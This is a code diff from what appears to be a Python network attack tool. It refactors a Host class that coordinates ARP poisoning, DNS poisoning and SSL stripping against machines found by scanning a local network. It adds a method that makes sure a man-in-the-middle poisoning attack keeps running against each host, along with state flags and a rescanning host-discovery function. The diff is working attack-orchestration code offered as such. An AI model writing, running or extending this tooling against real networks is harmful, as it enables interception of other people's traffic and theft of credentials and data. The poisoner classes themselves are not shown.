@@ -9,13 +9,15 @@ class Host():
 
     def __init__(self, ip, mac, interface, dns_queue_num):
 
-        self.ip            = ip
-        self.mac           = mac
-        self.arp_poisoner  = ArpPoisoner(interface)
-        self.arp_attack    = None
-        self.arp_active    = False
-        self.dns_poisoner  = DnsPoisoner(ip, dns_queue_num)
-        self.ssl_remover   = SslRemover(ip, dns_queue_num + 1)
+        self.ip             = ip
+        self.mac            = mac
+        self.arp_poisoner   = ArpPoisoner(interface)
+        self.arp_attack     = None
+        self.arp_started    = False
+        self.dns_poisoner   = DnsPoisoner(ip, dns_queue_num)
+        self.dns_started    = False
+        self.ssl_remover    = SslRemover(ip, dns_queue_num + 1)
+        self.seen_this_scan = True
 
     # prepares one-way arp poisoning attack, telling this host that "other_ip" is at "other_mac"
     def arp_oneway(self, other_ip, other_mac):
@@ -34,17 +36,48 @@ class Host():
         self.arp_poisoner.add_packet(other_mac, gateway_mac, self.ip, gateway_ip)
         self.arp_attack = "mitm"
 
+    # ensure that mitm arp poisoning attack is running against this host
+    def arp_ensure_mitm(self, gateway_ip, gateway_mac, other_mac):
+
+        # if attack is currently running
+        if self.arp_poisoner.is_alive():
+
+            # mitm attack is already running, so do nothing
+            if self.arp_attack == "mitm":
+                pass
+
+            # one-way attack is running, so stop it and run mitm attack instead
+            else:
+                self.arp_stop()
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
+
+        else:
+
+            # mitm attack is prepared but not running, so just start it
+            if self.arp_attack == "mitm":
+                self.arp_start()
+
+            else:
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
+
     # starts currently prepared arp poisoning attack
     def arp_start(self):
 
-        self.arp_poisoner.start()
-        self.arp_active = True
+        if self.arp_started:
+            self.arp_poisoner.run()
+
+        else:
+            self.arp_poisoner.start()
+            self.arp_started = True
 
     # stops currently running arp poisoning attack
     def arp_stop(self):
 
-        self.arp_poisoner.stop()
-        self.arp_active = False
+        if self.arp_started:
+            self.arp_poisoner.stop()
+            self.arp_started = False
 
     def dns_add(self, url, ip):
 
@@ -52,17 +85,37 @@ class Host():
 
     def dns_start(self):
 
-        self.dns_poisoner.start()
+        if self.dns_started:
+            self.dns_poisoner.run()
+
+        else: 
+            self.dns_poisoner.start()
+            self.dns_started = True
 
     def dns_stop(self):
 
+        if self.dns_started:
+            self.dns_poisoner.stop()
+            self.dns_started = False
+
+    def remove(self):
+
+        self.arp_poisoner.stop()
         self.dns_poisoner.stop()
 
 # scan on specified range and interface, return found gateway and hosts
-def get_hosts(interface, range_, timeout):
+def get_hosts(interface, range_, timeout, gateway, hosts):
 
-    gateway = None
-    hosts   = []
+    known_ips = []
+
+    for host in [gateway] + hosts:
+        
+        try:
+            known_ips.append(host.ip)
+            host.seen_this_scan = False
+
+        except AttributeError as _:
+            pass
 
     # if ip range is specified using netmask, convert to cidr
     if range_.count('.') > 4:
@@ -79,12 +132,24 @@ def get_hosts(interface, range_, timeout):
 
     for reply in replies:
 
-        # store ip ending in ".1" as gateway
-        if reply.psrc[-2:] == ".1":
-            gateway = Host(reply.psrc, reply.hwsrc, interface, 0)
-
-        # store other ip's in the list of hosts
+        if reply.psrc in known_ips:
+            
+            for host in [gateway] + hosts:
+            
+                if host.ip == reply.psrc:
+                    host.seen_this_scan = True
+        
         else:
-            hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))
+
+            # store ip ending in ".1" as gateway
+            if reply.psrc[-2:] == ".1":
+                gateway = Host(reply.psrc, reply.hwsrc, interface, 0)
+
+            # store other ip's in the list of hosts
+            else:
+                hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))
+
+    gateway = gateway if gateway.seen_this_scan else None
+    hosts   = [host for host in hosts if host.seen_this_scan]
 
     return gateway, hosts
